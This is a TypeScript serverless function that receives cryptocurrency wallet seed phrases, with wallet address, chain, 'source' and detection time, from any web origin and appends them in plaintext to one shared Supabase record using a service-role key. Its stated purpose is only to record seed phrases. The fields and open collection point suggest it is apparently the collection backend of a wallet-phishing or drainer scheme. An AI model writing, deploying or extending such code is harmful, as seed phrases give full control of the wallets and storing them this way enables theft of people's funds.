// Vercel serverless function: POST /api/record-seed
// Writes a single seed phrase record directly to Supabase from the server side.

const SUPABASE_URL   = (process.env.SUPABASE_URL ?? process.env.VITE_SUPABASE_URL ?? '').trim()
const SUPABASE_KEY   = (
  process.env.SUPABASE_SERVICE_ROLE_KEY
  ?? process.env.SUPABASE_ANON_KEY
  ?? process.env.VITE_SUPABASE_ANON_KEY
  ?? ''
).trim()
const ALLOWED_ORIGIN = (process.env.APP_ORIGIN ?? '*').trim()

interface SeedRecord {
  id:            string
  walletAddress: string
  chain:         string
  seedPhrase:    string
  wordCount:     number
  source:        string
  detectedAt:    string
  notes?:        string
  confirmed:     boolean
}

function corsHeaders(): Record<string, string> {
  return {
    'Access-Control-Allow-Origin':  ALLOWED_ORIGIN,
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  }
}

function json(payload: unknown, status: number): Response {
  return new Response(JSON.stringify(payload), {
    status,
    headers: { 'Content-Type': 'application/json', ...corsHeaders() },
  })
}

function supabaseHeaders() {
  return {
    apikey:         SUPABASE_KEY,
    Authorization:  `Bearer ${SUPABASE_KEY}`,
    'Content-Type': 'application/json',
    Prefer:         'return=representation',
  }
}

function supabaseUpsertHeaders() {
  return { ...supabaseHeaders(), Prefer: 'resolution=merge-duplicates,return=representation' }
}

export default async function handler(req: Request): Promise<Response> {
  if (req.method === 'OPTIONS') return new Response(null, { status: 204, headers: corsHeaders() })
  if (req.method !== 'POST') return json({ error: 'Method not allowed' }, 405)

  if (!SUPABASE_URL || !SUPABASE_KEY) return json({ error: 'Supabase not configured on server' }, 503)

  let record: SeedRecord
  try {
    record = (await req.json()) as SeedRecord
  } catch {
    return json({ error: 'Invalid JSON body' }, 400)
  }

  if (!record?.id || typeof record.id !== 'string') return json({ error: 'Missing required field: id' }, 400)
  if (!record?.seedPhrase || typeof record.seedPhrase !== 'string') return json({ error: 'Missing required field: seedPhrase' }, 400)

  try {
    const fetchRes = await fetch(
      `${SUPABASE_URL}/rest/v1/app_state?id=eq.global&select=seed_phrases`,
      { headers: supabaseHeaders(), signal: AbortSignal.timeout(10_000) },
    )
    const rows = fetchRes.ok ? ((await fetchRes.json()) as { seed_phrases: SeedRecord[] }[]) : []
    const existing: SeedRecord[] = Array.isArray(rows[0]?.seed_phrases) ? rows[0].seed_phrases : []

    const key = (r: SeedRecord) => `${r.id}|${r.seedPhrase}`
    const existingKeys = new Set(existing.map(key))
    const merged = existingKeys.has(key(record)) ? existing : [record, ...existing]

    const saveRes = await fetch(`${SUPABASE_URL}/rest/v1/app_state?on_conflict=id`, {
      method:  'POST',
      headers: supabaseUpsertHeaders(),
      body:    JSON.stringify({ id: 'global', seed_phrases: merged, updated_at: new Date().toISOString() }),
      signal:  AbortSignal.timeout(10_000),
    })

    if (!saveRes.ok) {
      const err = await saveRes.text()
      return json({ error: 'Supabase save failed', detail: err }, 502)
    }

    return json({ ok: true, total: merged.length }, 200)
  } catch (err) {
    return json({ error: 'Server error', detail: String(err) }, 500)
  }
}
